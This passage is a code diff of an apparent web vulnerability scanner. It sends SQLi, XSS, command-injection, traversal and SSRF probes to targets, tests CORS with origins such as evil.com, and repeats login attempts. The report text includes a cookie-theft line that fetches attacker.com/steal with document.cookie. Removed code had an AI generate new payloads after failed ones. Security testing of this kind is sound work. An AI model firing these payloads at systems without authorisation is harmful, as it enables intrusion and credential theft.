           'syntax error', 'unclosed quotation', 'warning: mysql', 'you have an error in your sql'];
 
-        const sqliUrl1 = new URL(endpoint);
-        sqliUrl1.searchParams.set(param, sqliProbeError);
-        const sqliResp1 = await fetchWithTimeout(sqliUrl1.toString(), 8000);
-        const sqliBody1 = await sqliResp1.text();
-        const hasError1 = sqlErrors.some(e => sqliBody1.toLowerCase().includes(e));
+        if (sqliPayloads.length >= 2) {
+          const sqliUrl1 = new URL(endpoint);
+          sqliUrl1.searchParams.set(param, sqliPayloads[0]);
+          const sqliResp1 = await fetchWithTimeout(sqliUrl1.toString(), 8000);
+          const sqliBody1 = await sqliResp1.text();
+          const hasError1 = sqlErrors.some(e => sqliBody1.toLowerCase().includes(e));
 
-        if (hasError1) {
-          // Dual confirm with a different SQLi payload
-          const sqliUrl2 = new URL(endpoint);
-          sqliUrl2.searchParams.set(param, "1 AND 1=2--");
-          const sqliResp2 = await fetchWithTimeout(sqliUrl2.toString(), 8000);
-          const sqliBody2 = await sqliResp2.text();
-          const hasError2 = sqlErrors.some(e => sqliBody2.toLowerCase().includes(e));
+          if (hasError1) {
+            const sqliUrl2 = new URL(endpoint);
+            sqliUrl2.searchParams.set(param, sqliPayloads[1]);
+            const sqliResp2 = await fetchWithTimeout(sqliUrl2.toString(), 8000);
+            const sqliBody2 = await sqliResp2.text();
+            const hasError2 = sqlErrors.some(e => sqliBody2.toLowerCase().includes(e));
 
-          if (hasError2) {
-            findings.push({
-              id: `SQLI-PARAM-${Date.now()}-${param}`,
-              severity: 'critical',
-              title: `SQL Injection in "${param}" [DUAL-CONFIRMED]`,
-              description: `Parameter "${param}" is vulnerable to SQL injection. Two independent probes both triggered database errors — high-confidence, not a false positive.`,
-              endpoint: sqliUrl1.toString(),
-              method: 'GET',
-              payload: sqliProbeError,
-              evidence: `Probe 1 SQL error: ${sqliBody1.slice(0, 200)}`,
-              evidence2: `Probe 2 SQL error: ${sqliBody2.slice(0, 200)} — dual-confirmed`,
-              dualConfirmed: true,
-              response: sqliBody1.slice(0, 500),
-              remediation: 'Use parameterized queries / prepared statements. Never interpolate user input into SQL.',
-              cwe: 'CWE-89',
-              cvss: 9.8,
-              mitre: ['T1190'],
-              confidence: 97,
-              poc: `curl "${sqliUrl1.toString()}"`,
-              exploitCode: `import requests\nr = requests.get("${sqliUrl1.toString()}")\nprint(r.text[:500])`
-            });
+            if (hasError2) {
+              findings.push({
+                id: `A03-SQLI-${Date.now()}-${param}`, severity: 'critical',
+                title: `SQL Injection in "${param}" [DUAL-CONFIRMED]`,
+                description: `Two independent SQLi probes triggered database errors in parameter "${param}".`,
+                endpoint: sqliUrl1.toString(), method: 'GET', owasp: 'A03:2021',
+                payload: sqliPayloads[0],
+                evidence: `Probe 1: ${sqliBody1.slice(0, 150)}`,
+                evidence2: `Probe 2: ${sqliBody2.slice(0, 150)}`,
+                dualConfirmed: true, remediation: 'Use parameterized queries / prepared statements.',
+                cwe: 'CWE-89', cvss: 9.8, mitre: ['T1190'], confidence: 97, category: 'injection',
+                poc: `curl -s "${sqliUrl1.toString()}" | head -20`
+              });
+            }
           }
+        }
+
+        // Command injection check
+        const cmdiPayloads = payloads.a03_cmdi || [];
+        for (const payload of cmdiPayloads.slice(0, 2)) {
+          try {
+            const cmdiUrl = new URL(endpoint);
+            cmdiUrl.searchParams.set(param, payload);
+            const cmdiResp = await fetchWithTimeout(cmdiUrl.toString(), 8000);
+            const cmdiBody = await cmdiResp.text();
+            if (cmdiBody.includes('uid=') || cmdiBody.includes('root:') || cmdiBody.includes('Directory of')) {
+              findings.push({
+                id: `A03-CMDI-${Date.now()}-${param}`, severity: 'critical',
+                title: `OS Command Injection in "${param}"`,
+                description: `Parameter "${param}" executes OS commands. Command output found in response.`,
+                endpoint: cmdiUrl.toString(), method: 'GET', owasp: 'A03:2021',
+                payload, evidence: `Response contains command output: ${cmdiBody.slice(0, 200)}`,
+                remediation: 'Never pass user input to shell commands. Use safe APIs.',
+                cwe: 'CWE-78', cvss: 9.8, mitre: ['T1059'], confidence: 95, category: 'injection',
+                poc: `curl -s "${cmdiUrl.toString()}"`
+              });
+              break;
+            }
+          } catch {}
+        }
+
+        // NoSQLi check
+        const nosqliPayloads = payloads.a03_nosqli || [];
+        for (const payload of nosqliPayloads.slice(0, 2)) {
+          try {
+            const nosqlUrl = new URL(endpoint);
+            nosqlUrl.searchParams.set(param, payload);
+            const nosqlResp = await fetchWithTimeout(nosqlUrl.toString(), 8000);
+            const nosqlBody = await nosqlResp.text();
+            if (nosqlBody.includes('MongoError') || nosqlBody.includes('$where') || nosqlBody.includes('SyntaxError')) {
+              findings.push({
+                id: `A03-NOSQLI-${Date.now()}-${param}`, severity: 'high',
+                title: `NoSQL Injection in "${param}"`,
+                description: `Parameter susceptible to NoSQL injection — MongoDB/NoSQL error in response.`,
+                endpoint: nosqlUrl.toString(), method: 'GET', owasp: 'A03:2021', payload,
+                evidence: `NoSQL error: ${nosqlBody.slice(0, 200)}`,
+                remediation: 'Validate and sanitize all NoSQL query inputs.',
+                cwe: 'CWE-943', cvss: 8.6, confidence: 85, category: 'injection',
+                poc: `curl -s "${nosqlUrl.toString()}"`
+              });
+              break;
+            }
+          } catch {}
         }
       }
     } catch {}
 
-    // ── Directory listing ─────────────────────────────────────────────────────
-    if ((responseText.includes('Index of /') || responseText.includes('<title>Index of')) && status === 200) {
+    // ── A05: Security Misconfiguration ───────────────────────────────────
+    const isRootEndpoint = !endpoint.includes('?') && (endpoint.endsWith('/') || endpoint.split('/').length <= 4);
+    if (isRootEndpoint) {
+      const secHeaders: Array<[string, string, string, string]> = [
+        ['x-frame-options', 'CWE-1021', 'Add X-Frame-Options: DENY', 'A05:2021'],
+        ['content-security-policy', 'CWE-79', 'Implement strict CSP', 'A05:2021'],
+        ['strict-transport-security', 'CWE-319', 'Add HSTS header', 'A05:2021'],
+        ['x-content-type-options', 'CWE-430', 'Add X-Content-Type-Options: nosniff', 'A05:2021'],
+      ];
+      for (const [hdr, cwe, remediation, owasp] of secHeaders) {
+        if (!response.headers.get(hdr)) {
+          findings.push({
+            id: `A05-HDR-${hdr.replace(/-/g, '').toUpperCase()}-${Date.now()}`,
+            severity: 'low',
+            title: `Missing ${hdr.split('-').map(w => w.charAt(0).toUpperCase() + w.slice(1)).join('-')}`,
+            description: `Security header "${hdr}" is absent.`,
+            endpoint, owasp, evidence: 'Header absent', evidence2: 'Confirmed on root endpoint',
+            dualConfirmed: true, remediation, cwe, confidence: 100, category: 'misconfig'
+          });
+        }
+      }
+
+      // Server/tech disclosure
+      const serverHeader = response.headers.get('server');
+      if (serverHeader) {
+        findings.push({
+          id: `A05-SVRDISCO-${Date.now()}`, severity: 'low',
+          title: `Server Disclosure: ${serverHeader}`, description: `Server header: "${serverHeader}"`,
+          endpoint, owasp: 'A05:2021', evidence: `Server: ${serverHeader}`,
+          evidence2: 'Header value confirmed', dualConfirmed: true,
+          remediation: 'Remove or obfuscate Server header', cwe: 'CWE-200', confidence: 100, category: 'misconfig'
+        });
+      }
+    }
+
+    // ── A06: Vulnerable Components ───────────────────────────────────────
+    if (responseText.match(/(?:jQuery\/[0-9]|Bootstrap\/[0-9]|Angular\/[0-9])/i)) {
+      const versionMatch = responseText.match(/(jQuery|Bootstrap|Angular)\/([0-9]+\.[0-9]+\.[0-9]+)/i);
+      if (versionMatch) {
+        findings.push({
+          id: `A06-OUTDATED-${Date.now()}`, severity: 'medium',
+          title: `Outdated Component: ${versionMatch[1]} v${versionMatch[2]}`,
+          description: `Using ${versionMatch[1]} version ${versionMatch[2]} which may have known CVEs.`,
+          endpoint, owasp: 'A06:2021',
+          evidence: `Version string: ${versionMatch[0]}`,
+          remediation: `Update ${versionMatch[1]} to latest version.`,
+          cwe: 'CWE-1104', confidence: 88, category: 'components'
+        });
+      }
+    }
+
+    // ── A08: Data Integrity (CRLF injection for header injection) ────────
+    for (const payload of (payloads.a09_logging || []).slice(0, 2)) {
+      try {
+        const crlfUrl = new URL(endpoint);
+        crlfUrl.searchParams.set('test', payload);
+        const crlfResp = await fetchWithTimeout(crlfUrl.toString(), 6000);
+        const injectedHeader = crlfResp.headers.get('injected-header') || crlfResp.headers.get('set-cookie');
+        if (injectedHeader?.includes('pwned') || injectedHeader?.includes('Injected')) {
+          findings.push({
+            id: `A08-CRLF-${Date.now()}`, severity: 'high',
+            title: 'HTTP Header Injection (CRLF)',
+            description: 'User input injected into HTTP response headers via CRLF characters.',
+            endpoint: crlfUrl.toString(), method: 'GET', owasp: 'A08:2021', payload,
+            evidence: `Injected header found: ${injectedHeader}`,
+            remediation: 'Strip CR/LF characters from user input before using in headers.',
+            cwe: 'CWE-113', cvss: 7.5, confidence: 92, category: 'integrity',
+            poc: `curl -sI "${crlfUrl.toString()}" | grep -i injected`
+          });
+          break;
+        }
+      } catch {}
+    }
+
+    // ── A09: Verbose Error Disclosure ────────────────────────────────────
+    if (responseText.match(/(?:fatal error|stack trace|traceback|pg_query|mysqli_query|at\s+[\w.]+\()/i) && status >= 400) {
       findings.push({
-        id: `DIRLIST-${Date.now()}`,
-        severity: 'medium',
-        title: 'Directory Listing Enabled',
-        description: 'Server exposes directory contents, potentially revealing sensitive files and paths.',
-        endpoint,
-        method: 'GET',
-        evidence: 'Response contains "Index of /" HTML pattern',
-        evidence2: 'HTTP 200 status code confirms listing is served',
-        dualConfirmed: true,
-        remediation: 'Disable directory listing in web server configuration (Options -Indexes in Apache)',
-        cwe: 'CWE-548',
-        confidence: 96,
-        poc: `curl "${endpoint}"`
+        id: `A09-ERRORDISCO-${Date.now()}`, severity: 'medium',
+        title: 'Verbose Error / Stack Trace Disclosure',
+        description: 'Application leaks internal error details (file paths, stack traces, DB queries).',
+        endpoint, method: 'GET', owasp: 'A09:2021',
+        evidence: 'Error patterns in response body', evidence2: `HTTP ${status} with debug output`,
+        dualConfirmed: true, remediation: 'Disable debug mode. Use generic error pages.',
+        cwe: 'CWE-209', confidence: 88, category: 'logging',
+        poc: `curl -s "${endpoint}" | grep -iE "error|exception|stack"`
       });
     }
 
-    // ── Verbose error disclosure ──────────────────────────────────────────────
-    if (responseText.match(/(?:fatal error|stack trace|traceback|pg_query|mysqli_query)/i) && status >= 400) {
+    // ── Directory listing ───────────────────────────────────────────────
+    if ((responseText.includes('Index of /') || responseText.includes('<title>Index of')) && status === 200) {
       findings.push({
-        id: `INFO-LEAK-${Date.now()}`,
-        severity: 'medium',
-        title: 'Verbose Error / Stack Trace Disclosure',
-        description: 'Application leaks internal error information, exposing file paths, stack traces, or DB queries.',
-        endpoint,
-        method: 'GET',
-        evidence: 'Error/stack trace patterns in response body',
-        evidence2: `HTTP ${status} error response with debug output`,
-        dualConfirmed: status >= 400,
-        remediation: 'Disable debug mode in production. Use generic error pages.',
-        cwe: 'CWE-209',
-        confidence: 88,
-        poc: `curl "${endpoint}"`
+        id: `A05-DIRLIST-${Date.now()}`, severity: 'medium',
+        title: 'Directory Listing Enabled', description: 'Server exposes directory contents.',
+        endpoint, method: 'GET', owasp: 'A05:2021',
+        evidence: 'Response contains "Index of /"', evidence2: 'HTTP 200 confirms listing',
+        dualConfirmed: true, remediation: 'Disable directory listing (Options -Indexes).',
+        cwe: 'CWE-548', confidence: 96, category: 'misconfig',
+        poc: `curl -s "${endpoint}" | grep "Index of"`
       });
     }
 
@@ -1024,64 +1150,169 @@ async function assessEndpoint(
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// DEEP INJECTION TESTING (forms + params)
+// CORS, TRAVERSAL, COOKIE SCANNERS (kept from v5)
+// ═══════════════════════════════════════════════════════════════════════════════
+async function scanCORS(targetUrl: string): Promise<Finding[]> {
+  const findings: Finding[] = [];
+  const attackOrigins = ['https://evil.com', 'https://attacker.com', 'null', `https://evil.${new URL(targetUrl).hostname}`];
+
+  for (const origin of attackOrigins) {
+    try {
+      const optionsResp = await fetchWithTimeout(targetUrl, 10000, {
+        method: 'OPTIONS',
+        headers: { 'Origin': origin, 'Access-Control-Request-Method': 'GET', 'Access-Control-Request-Headers': 'authorization' }
+      });
+      const acao = optionsResp.headers.get('access-control-allow-origin');
+      const acac = optionsResp.headers.get('access-control-allow-credentials');
+
+      const getResp = await fetchWithTimeout(targetUrl, 10000, { method: 'GET', headers: { 'Origin': origin } });
+      const acao2 = getResp.headers.get('access-control-allow-origin');
+
+      const reflectsInOptions = acao === origin || acao === '*';
+      const reflectsInGet = acao2 === origin || acao2 === '*';
+
+      if (reflectsInOptions && reflectsInGet) {
+        const withCredentials = acac === 'true';
+        findings.push({
+          id: `CORS-REFLECT-${Date.now()}`, severity: withCredentials ? 'critical' : 'high',
+          title: `CORS: Arbitrary Origin Reflected`, owasp: 'A05:2021',
+          description: `Server reflects "${origin}". ${withCredentials ? 'With credentials=true → session theft.' : 'Cross-origin data exfiltration.'}`,
+          endpoint: targetUrl, method: 'GET', payload: `Origin: ${origin}`,
+          evidence: `OPTIONS ACAO: ${acao}`, evidence2: `GET ACAO: ${acao2}`,
+          dualConfirmed: true, remediation: 'Whitelist trusted origins only.',
+          cwe: 'CWE-346', cvss: withCredentials ? 9.3 : 7.4, mitre: ['T1557'], confidence: 95, category: 'cors',
+          poc: `fetch("${targetUrl}", {credentials:"include",headers:{"Origin":"${origin}"}}).then(r=>r.text()).then(console.log)`
+        });
+        break;
+      }
+    } catch {}
+  }
+  return findings;
+}
+
+async function scanDirectoryTraversal(targetUrl: string, extractedParams: string[]): Promise<Finding[]> {
+  const findings: Finding[] = [];
+  const traversalPayloads = [
+    '../../../etc/passwd', '....//....//....//etc/passwd',
+    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '..%252F..%252F..%252Fetc%252Fpasswd',
+    '....\\....\\....\\windows\\win.ini',
+  ];
+  const fileParams = [...new Set([...extractedParams, 'file', 'path', 'page', 'include', 'load', 'template', 'doc', 'read', 'view'])];
+
+  for (const param of fileParams.slice(0, 8)) {
+    for (const payload of traversalPayloads.slice(0, 3)) {
+      try {
+        const testUrl = new URL(targetUrl);
+        testUrl.searchParams.set(param, payload);
+        const resp1 = await fetchWithTimeout(testUrl.toString(), 10000);
+        const body1 = await resp1.text();
+        const isHit = body1.includes('root:x:0:0') || body1.includes('/bin/bash') || body1.toLowerCase().includes('[extensions]');
+
+        if (isHit) {
+          const payload2 = payload.replace(/\.\./g, '%2e%2e').replace(/\//g, '%2f');
+          const testUrl2 = new URL(targetUrl);
+          testUrl2.searchParams.set(param, payload2);
+          const resp2 = await fetchWithTimeout(testUrl2.toString(), 10000);
+          const body2 = await resp2.text();
+          const dualConfirmed = body2.includes('root:x:0:0') || body2.includes('/bin/bash') || body2.toLowerCase().includes('[extensions]');
+
+          findings.push({
+            id: `TRAVERSAL-${Date.now()}-${param}`, severity: 'critical',
+            title: `Path Traversal in "${param}" ${dualConfirmed ? '[DUAL-CONFIRMED]' : ''}`,
+            description: `Parameter "${param}" allows reading arbitrary server files.`,
+            endpoint: testUrl.toString(), method: 'GET', payload, owasp: 'A01:2021',
+            evidence: `File content: ${body1.slice(0, 200)}`,
+            evidence2: dualConfirmed ? 'Second encoding confirmed' : 'Needs manual verify',
+            dualConfirmed, remediation: 'Validate file paths against allowlist.',
+            cwe: 'CWE-22', cvss: 9.3, mitre: ['T1083'], confidence: dualConfirmed ? 97 : 75, category: 'traversal',
+            poc: `curl -s "${testUrl.toString()}" | head -5`
+          });
+          break;
+        }
+      } catch {}
+    }
+  }
+  return findings;
+}
+
+async function scanCookieSecurity(targetUrl: string): Promise<Finding[]> {
+  const findings: Finding[] = [];
+  try {
+    const resp = await fetchWithTimeout(targetUrl, 12000);
+    const cookieHeader = resp.headers.get('set-cookie');
+    if (!cookieHeader) return findings;
+
+    const bodyText = await resp.text().catch(() => '');
+    const cookies = cookieHeader.split(/,(?=[^;])/);
+    const isHTTPS = targetUrl.startsWith('https');
+    const hasInlineScripts = /<script[^>]*>[^<]{10,}/i.test(bodyText);
+
+    for (const cookie of cookies) {
+      const cookieLower = cookie.toLowerCase();
+      const cookieName = cookie.split('=')[0].trim();
+
+      if (!cookieLower.includes('httponly')) {
+        findings.push({
+          id: `COOKIE-NOHTTPONLY-${Date.now()}-${cookieName.slice(0, 10)}`, severity: hasInlineScripts ? 'high' : 'medium',
+          title: `Cookie "${cookieName}" Missing HttpOnly`, owasp: 'A05:2021',
+          description: `Cookie accessible via JS. ${hasInlineScripts ? 'Inline scripts present — XSS→theft confirmed.' : ''}`,
+          endpoint: targetUrl, method: 'GET',
+          evidence: `Set-Cookie: ${cookie.slice(0, 150)}`,
+          evidence2: hasInlineScripts ? 'Inline scripts confirm theft vector' : 'Medium risk without XSS',
+          dualConfirmed: hasInlineScripts, remediation: 'Add HttpOnly flag.',
+          cwe: 'CWE-1004', cvss: hasInlineScripts ? 7.4 : 5.4, confidence: hasInlineScripts ? 88 : 72, category: 'cookie',
+          poc: `# XSS → Cookie theft\nfetch("https://attacker.com/steal?c="+document.cookie)`
+        });
+      }
+
+      if (!cookieLower.includes('; secure') && isHTTPS) {
+        findings.push({
+          id: `COOKIE-NOSECURE-${Date.now()}-${cookieName.slice(0, 10)}`, severity: 'medium',
+          title: `Cookie "${cookieName}" Missing Secure Flag`, owasp: 'A02:2021',
+          description: `Cookie transmittable over HTTP despite HTTPS site.`,
+          endpoint: targetUrl, evidence: `Set-Cookie: ${cookie.slice(0, 150)}`,
+          evidence2: 'HTTPS site, no Secure flag — protocol mismatch confirmed',
+          dualConfirmed: true, remediation: 'Add Secure flag.',
+          cwe: 'CWE-614', cvss: 6.5, confidence: 90, category: 'cookie'
+        });
+      }
+
+      if (!cookieLower.includes('samesite')) {
+        findings.push({
+          id: `COOKIE-NOSAMESITE-${Date.now()}-${cookieName.slice(0, 10)}`, severity: 'medium',
+          title: `Cookie "${cookieName}" Missing SameSite`, owasp: 'A01:2021',
+          description: `Cookie vulnerable to CSRF attacks.`,
+          endpoint: targetUrl, evidence: `Set-Cookie: ${cookie.slice(0, 150)}`,
+          evidence2: 'SameSite absence confirmed', dualConfirmed: true,
+          remediation: 'Add SameSite=Strict or Lax.',
+          cwe: 'CWE-352', cvss: 5.4, confidence: 92, category: 'cookie',
+          poc: `<form action="${targetUrl}" method="POST"><input type="hidden" name="action" value="delete"/><input type="submit"/></form>`
+        });
+      }
+    }
+  } catch {}
+  return findings;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// DEEP INJECTION (forms + params)
 // ═══════════════════════════════════════════════════════════════════════════════
 async function performDeepInjectionTest(
-  target: URL,
-  forms: any[],
-  params: string[],
-  apiKey: string | undefined,
-  failedPayloads: string[],
-  retryWithAI: boolean
+  target: URL, forms: any[], params: string[],
+  payloads: Record<string, string[]>, failedPayloads: string[]
 ): Promise<Finding[]> {
   const findings: Finding[] = [];
-
-  let payloads = {
-    xss: [
-      '"><img src=x onerror=alert(1)>',
-      '<svg/onload=alert(document.domain)>',
-      "'-alert(1)-'",
-      '<script>alert(1)</script>',
-      '"><svg/onload=confirm(1)>'
-    ],
-    sqli: [
-      "'\"",
-      "' OR '1'='1",
-      "1 UNION SELECT NULL--",
-      "'; DROP TABLE users--",
-      "' AND SLEEP(5)--"
-    ],
-    ssrf: [
-      'http://169.254.169.254/latest/meta-data/',
-      'http://127.0.0.1:80/',
-      'file:///etc/passwd',
-    ],
-    lfi: [
-      '../../../etc/passwd',
-      '....//....//....//etc/passwd',
-      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
-    ]
-  };
-
-  // AI-enhanced payloads on retry
-  if (retryWithAI && apiKey && failedPayloads.length > 0) {
-    const aiPayloads = await generateAIPayloads(apiKey, failedPayloads, target.toString());
-    if (aiPayloads) payloads = { ...payloads, ...aiPayloads };
-  }
-
   const sqlErrors = ['sql syntax', 'mysql_fetch', 'pg_query', 'sqlite', 'ora-', 'sql error', 'odbc',
     'syntax error', 'unclosed quotation', 'warning: mysql', 'you have an error in your sql'];
 
-  // Test forms
-  for (const form of forms.slice(0, 10)) {
+  for (const form of (forms || []).slice(0, 10)) {
     const formUrl = form.action ? new URL(form.action, target).toString() : target.toString();
 
     for (const input of form.inputs) {
-      // XSS — dual confirm: two payloads must both reflect
+      // XSS dual-confirm
       let xssReflected = 0;
       let lastXssPayload = '';
-      let lastXssEvidence = '';
-      for (const payload of payloads.xss.slice(0, 3)) {
+      for (const payload of (payloads.a03_xss || []).slice(0, 4)) {
         if (failedPayloads.includes(payload)) continue;
         try {
           const formData = new URLSearchParams();
@@ -1095,7 +1326,6 @@ async function performDeepInjectionTest(
           if (responseText.includes(payload) || responseText.includes('onerror=') || responseText.includes('onload=')) {
             xssReflected++;
             lastXssPayload = payload;
-            lastXssEvidence = `"${input.name}" reflects: ${payload.slice(0, 80)}`;
           }
         } catch {}
         if (xssReflected >= 2) break;
@@ -1103,31 +1333,21 @@ async function performDeepInjectionTest(
 
       if (xssReflected >= 2) {
         findings.push({
-          id: `XSS-FORM-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
-          severity: 'high',
-          title: `Reflected XSS in form field "${input.name}" [DUAL-CONFIRMED]`,
-          description: `Form field "${input.name}" at ${formUrl} reflects 2+ different XSS payloads without sanitization.`,
-          endpoint: formUrl,
-          method: form.method,
-          payload: lastXssPayload,
-          evidence: lastXssEvidence,
-          evidence2: `${xssReflected} independent payloads reflected — dual-confirmed`,
-          dualConfirmed: true,
-          response: lastXssEvidence,
-          remediation: 'Implement output encoding and CSP. Use htmlspecialchars() or equivalent.',
-          cwe: 'CWE-79',
-          cvss: 6.1,
-          mitre: ['T1059.007'],
-          confidence: 93,
+          id: `A03-XSS-FORM-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
+          severity: 'high', title: `Reflected XSS in form "${input.name}" [DUAL-CONFIRMED]`,
+          description: `${xssReflected} payloads reflected without sanitization.`,
+          endpoint: formUrl, method: form.method, payload: lastXssPayload, owasp: 'A03:2021',
+          evidence: `${xssReflected} payloads reflected`,
+          dualConfirmed: true, remediation: 'Implement output encoding and CSP.',
+          cwe: 'CWE-79', cvss: 6.1, confidence: 93, category: 'injection',
           poc: `curl -X ${form.method} "${formUrl}" -d "${input.name}=${encodeURIComponent(lastXssPayload)}"`
         });
       }
 
-      // SQLi — dual confirm: two payloads must both trigger error
+      // SQLi dual-confirm
       let sqliErrors = 0;
       let lastSqliPayload = '';
-      let lastSqliEvidence = '';
-      for (const payload of payloads.sqli.slice(0, 3)) {
+      for (const payload of (payloads.a03_sqli || []).slice(0, 4)) {
         if (failedPayloads.includes(payload)) continue;
         try {
           const formData = new URLSearchParams();
@@ -1138,10 +1358,9 @@ async function performDeepInjectionTest(
             body: form.method === 'POST' ? formData.toString() : undefined
           });
           const responseText = await response.text();
-          if (sqlErrors.some(e => responseText.toLowerCase().includes(e))) {
+          if (sqlErrors.some((e: string) => responseText.toLowerCase().includes(e))) {
             sqliErrors++;
             lastSqliPayload = payload;
-            lastSqliEvidence = `SQL error in response to payload "${payload.slice(0, 60)}"`;
           }
         } catch {}
         if (sqliErrors >= 2) break;
@@ -1149,32 +1368,22 @@ async function performDeepInjectionTest(
 
       if (sqliErrors >= 2) {
         findings.push({
-          id: `SQLI-FORM-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
-          severity: 'critical',
-          title: `SQL Injection in form field "${input.name}" [DUAL-CONFIRMED]`,
-          description: `Field "${input.name}" at ${formUrl} triggers SQL errors with 2+ independent payloads — confirmed real, not a false positive.`,
-          endpoint: formUrl,
-          method: form.method,
-          payload: lastSqliPayload,
-          evidence: lastSqliEvidence,
-          evidence2: `${sqliErrors} independent payloads triggered SQL errors — dual-confirmed`,
-          dualConfirmed: true,
-          remediation: 'Use parameterized queries / prepared statements.',
-          cwe: 'CWE-89',
-          cvss: 9.8,
-          mitre: ['T1190', 'T1505'],
-          confidence: 96,
-          poc: `curl -X ${form.method} "${formUrl}" -d "${input.name}=${encodeURIComponent(lastSqliPayload)}"`,
-          exploitCode: `import requests\ndata = {"${input.name}": "${lastSqliPayload}"}\nr = requests.${form.method.toLowerCase()}("${formUrl}", data=data)\nprint(r.text[:500])`
+          id: `A03-SQLI-FORM-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
+          severity: 'critical', title: `SQL Injection in form "${input.name}" [DUAL-CONFIRMED]`,
+          description: `${sqliErrors} payloads triggered SQL errors.`,
+          endpoint: formUrl, method: form.method, payload: lastSqliPayload, owasp: 'A03:2021',
+          evidence: `${sqliErrors} SQL errors triggered`,
+          dualConfirmed: true, remediation: 'Use parameterized queries.',
+          cwe: 'CWE-89', cvss: 9.8, mitre: ['T1190'], confidence: 96, category: 'injection',
+          poc: `curl -X ${form.method} "${formUrl}" -d "${input.name}=${encodeURIComponent(lastSqliPayload)}"`
         });
       }
     }
   }
 
-  // Test URL params for SSRF and LFI
-  for (const param of params.slice(0, 10)) {
-    // SSRF
-    for (const payload of payloads.ssrf.slice(0, 2)) {
+  // SSRF via params
+  for (const param of (params || []).slice(0, 8)) {
+    for (const payload of (payloads.a10_ssrf || []).slice(0, 3)) {
       try {
         const testUrl = new URL(target.toString());
         testUrl.searchParams.set(param, payload);
@@ -1182,22 +1391,14 @@ async function performDeepInjectionTest(
         const responseText = await response.text();
         if (responseText.includes('root:') || responseText.includes('ami-id') || responseText.includes('instance-id')) {
           findings.push({
-            id: `SSRF-${Date.now()}`,
-            severity: 'critical',
-            title: 'Server-Side Request Forgery (SSRF)',
-            description: `Parameter "${param}" is vulnerable to SSRF — internal resource content returned`,
-            endpoint: testUrl.toString(),
-            method: 'GET',
-            payload,
-            evidence: 'Internal resource content in response',
-            evidence2: 'Response contains cloud metadata / /etc/passwd content',
-            dualConfirmed: true,
-            remediation: 'Validate and whitelist URLs before server-side requests',
-            cwe: 'CWE-918',
-            cvss: 9.0,
-            mitre: ['T1552.005'],
-            confidence: 92,
-            poc: `curl "${testUrl.toString()}"`
+            id: `A10-SSRF-${Date.now()}`, severity: 'critical',
+            title: `SSRF in "${param}"`, owasp: 'A10:2021',
+            description: `Internal resource content returned via parameter "${param}".`,
+            endpoint: testUrl.toString(), method: 'GET', payload,
+            evidence: 'Internal content in response', dualConfirmed: true,
+            remediation: 'Validate and whitelist URLs.',
+            cwe: 'CWE-918', cvss: 9.0, mitre: ['T1552.005'], confidence: 92, category: 'ssrf',
+            poc: `curl -s "${testUrl.toString()}"`
           });
           break;
         }
@@ -1213,7 +1414,7 @@ async function performDeepInjectionTest(
 // ═══════════════════════════════════════════════════════════════════════════════
 async function testAuthentication(target: URL, authEndpoints: string[]): Promise<Finding[]> {
   const findings: Finding[] = [];
-  const endpoints = authEndpoints.length > 0 ? authEndpoints :
+  const endpoints = authEndpoints?.length > 0 ? authEndpoints :
     ['/login', '/signin', '/auth', '/api/login'].map(p => new URL(p, target).toString());
 
   for (const endpoint of endpoints.slice(0, 4)) {
@@ -1232,62 +1433,46 @@ async function testAuthentication(target: URL, authEndpoints: string[]): Promise
       }
       if (blockedAt === 0) {
         findings.push({
-          id: `AUTH-BRUTEFORCE-${Date.now()}`,
-          severity: 'high',
-          title: 'No Brute Force Protection',
-          description: '12+ failed login attempts accepted without rate limiting or lockout',
-          endpoint,
-          method: 'POST',
-          evidence: 'No 429/423 response after 12 attempts (technique 1)',
-          evidence2: 'Continued accepting requests — dual-confirmed',
-          dualConfirmed: true,
-          remediation: 'Implement account lockout and rate limiting',
-          cwe: 'CWE-307',
-          cvss: 7.5,
-          mitre: ['T1110'],
-          confidence: 88,
+          id: `A07-BRUTEFORCE-${Date.now()}`, severity: 'high',
+          title: 'No Brute Force Protection', owasp: 'A07:2021',
+          description: '12+ failed login attempts without rate limiting.',
+          endpoint, method: 'POST',
+          evidence: 'No 429/423 after 12 attempts', evidence2: 'Continued accepting — confirmed',
+          dualConfirmed: true, remediation: 'Implement rate limiting and account lockout.',
+          cwe: 'CWE-307', cvss: 7.5, mitre: ['T1110'], confidence: 88, category: 'auth',
           poc: `for i in {1..12}; do curl -X POST "${endpoint}" -d "username=admin&password=test$i"; done`
         });
       }
 
       // User enumeration
       const [resp1, resp2] = await Promise.all([
-        fetchWithTimeout(endpoint, 8000, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'username=admin&password=wrongpass123' }).catch(() => null),
-        fetchWithTimeout(endpoint, 8000, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'username=nonexistent99999&password=wrongpass123' }).catch(() => null)
+        fetchWithTimeout(endpoint, 8000, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'username=admin&password=wrong123' }).catch(() => null),
+        fetchWithTimeout(endpoint, 8000, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'username=nonexistent99999&password=wrong123' }).catch(() => null)
       ]);
-
       if (resp1 && resp2) {
         const body1 = (await resp1.text()).toLowerCase();
         const body2 = (await resp2.text()).toLowerCase();
-        const enumKeywords = ['not found', 'invalid user', "doesn't exist", 'no such user', 'user not found'];
+        const enumKeywords = ['not found', 'invalid user', "doesn't exist", 'no such user'];
         if (body1 !== body2 && enumKeywords.some(k => body2.includes(k))) {
           findings.push({
-            id: `AUTH-ENUM-${Date.now()}`,
-            severity: 'medium',
-            title: 'User Enumeration via Error Messages',
-            description: 'Login endpoint reveals different error messages for valid vs invalid usernames',
-            endpoint,
-            method: 'POST',
-            evidence: 'Different responses for "admin" vs nonexistent user',
-            evidence2: 'Response contains username-specific error text — dual-confirmed',
-            dualConfirmed: true,
-            remediation: 'Return the same generic error message regardless of username validity',
-            cwe: 'CWE-204',
-            confidence: 82,
